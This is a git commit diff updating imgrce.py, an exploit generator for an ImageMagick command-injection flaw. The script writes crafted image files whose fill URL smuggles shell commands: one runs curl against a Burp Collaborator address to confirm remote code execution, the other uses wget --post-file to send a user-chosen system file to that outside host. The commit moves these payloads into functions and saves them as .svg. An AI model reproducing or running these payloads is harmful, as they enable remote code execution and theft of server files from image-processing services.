c3e2316d7f05c743d1a2201442b947c13a9f7bf8
Ankit Singh <ankitk323@gmail.com>
2023-11-17 21:46:40 +0530

    Update imgrce.py

--- imgrce.py
+++ imgrce.py
@@ -17,65 +17,48 @@ print(name)
 
 Collaborator=(input("\n[*] Enter the Burp Collaborator Link> "))
 
-command_1="""push graphic-context 
+def check():
+    command_1="""push graphic-context 
 viewbox 0 0 640 480
 fill 'url(https://example.com/image.jpg "|curl %s")'
 pop graphic-context
 """%(Collaborator)
-
-def check():
-    with open("imgrce.png","w") as img:
+    with open("imgrce.svg","w") as img:
         print("-"*20)
         print("Exploit Created!.. visit the Collaborator")
         print("-"*20)
         img.write(command_1)
         img.close()
-        out = (input("[*] Do you want to exit y/n> "))
-        if out == "y":
-            print("\nThanks")
-            exit()
-        elif out == "n":
-            return()
-        else:
-            print("[*] Please select yes or no.")
 
 def system_file():
-    with open("imgrce.png","w") as img:
+    command_2="""push graphic-context 
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg "|wget --post-file %s %s")'
+pop graphic-context
+"""%(file,Collaborator)
+    with open("imgrce.svg","w") as img:
         print("-"*20)
         print("Exploit Created!.. visit the Collaborator")
         print("-"*20)
         img.write(command_2)
         img.close()
-        out = (input("[*] Do you want to exit y/n> "))
-        if out == "y":
-            print("\nThanks")
-            exit()
-        elif out == "n":
-            return()
-        else:
-            print("[*] Please select yes or no.")
-
 
 if ".oastify.com" in Collaborator:
     active = True
     while active:
-        print("\n[0] Press 0 to exit from script")
         print("[1] Press 1 to check the vulnerability")
         print("[2] Press 2 to exploit the vulnerability")
-        select = int(input("\n[*] Select the option> "))
-        if select == 0:
-            print("\nThanks")
-            exit()
-        elif select == 1:
+        print("[0] Press 0 to exit")
+        select = input("\n[*] Select the option> ")
+
+        if select == "1":
             check()
-        elif select == 2:
+        elif select == "2":
             file =(input("[*] Enter the System file name> "))
-            command_2="""push graphic-context 
-viewbox 0 0 640 480
-fill 'url(https://example.com/image.jpg "|wget --post-file %s %s")'
-pop graphic-context
-            """%(file,Collaborator)
             system_file()
+        elif select == "0":
+            print("Exiting the script.")
+            active = False
         else:
             print("\n>Error, Enter The Correct Number!!")
 else:
